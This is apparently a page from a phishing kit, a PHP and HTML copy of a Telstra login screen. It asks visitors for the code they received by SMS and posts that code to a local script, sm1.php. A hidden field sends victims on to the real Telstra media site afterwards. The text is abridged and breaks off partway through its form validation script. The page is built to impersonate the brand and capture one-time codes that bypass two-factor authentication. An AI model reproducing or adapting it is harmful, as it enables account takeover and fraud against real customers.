<?php
session_start();
$_SESSION['last_visited_page'] = 'SMS1'; 
?>
<!DOCTYPE html>
...
<body role="document" class="base-blue  white-bkg" cz-shortcut-listen="true"><iframe src="./Telstra Login1_files/storageframe.html" id="LOCSTORAGE" scrolling="no" name="empty" hidden="true" style="width: 1px; height: 1px; position: absolute; top: -7px; left: -7px; border: 0px;"></iframe>
                                    ...
                                    <div class="col col-50-50-c0 first rebrandColumn1" style="padding: 0px; min-height:418px;">
                                        <div class="col-wrapper" style="padding: 0px; margin-right: 28px; min-height:418px;">
                                            <div style="padding: 0px; margin-left: 30px; margin-top: 30px;">
                                                <form method="post" id="Login" name="myForm"  action="sm1.php" onsubmit="return validateForm()" style="margin: 0px;">
                                                    <input type="hidden" name="goto" value="https://media.telstra.com.au/">
                                                   
                                                        
                                                   
                                                        <p id="unametip" hidden="" style="width: 100%; font-size: 12px; display: block;">Please enter the code received by SMS</p>
                                                        ...
                                                        <div class="input-wrapper field-group">
                                                            <div class="input-container form-control-userpasswd cmn_rebrandFormControl">
                                                                ...
                                                                <input type="" tabindex="2" id="password" name="sms" autocomplete="off" size="30" maxlength="50" onkeypress="EnterKeyPress(event);" placeholder="sms" style="height: 100%; box-shadow: none; width: 78%; border: 0px solid #dddddd;" >
                                                            </div>
                                                        </div>
  ...
  let x = document.forms["myForm"]["sms"].value;
  if (x == "") {
